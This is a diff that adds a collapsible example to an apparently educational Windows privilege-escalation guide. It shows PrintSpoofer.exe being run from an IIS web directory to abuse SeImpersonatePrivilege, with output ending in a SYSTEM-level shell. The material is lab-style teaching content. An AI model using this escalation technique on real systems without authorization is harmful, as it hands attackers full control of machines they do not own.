@@ -801,6 +801,20 @@ The easiest way to gain access to another user is to gather credentials from a c
 
     <details>
     <summary>PrintSpoofer.exe</summmary>
+
+    ```
+    C:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c cmd
+    PrintSpoofer.exe -i -c cmd
+    [+] Found privilege: SeImpersonatePrivilege
+    [+] Named pipe listening...
+    [+] CreateProcessAsUser() OK
+    Microsoft Windows [Version 10.0.14393]
+    (c) 2016 Microsoft Corporation. All rights reserved.
+
+    C:\Windows\system32>whoami
+    whoami
+    nt authority\system
+    ```
     </details>
 
 ### Abusing vulnerable software  
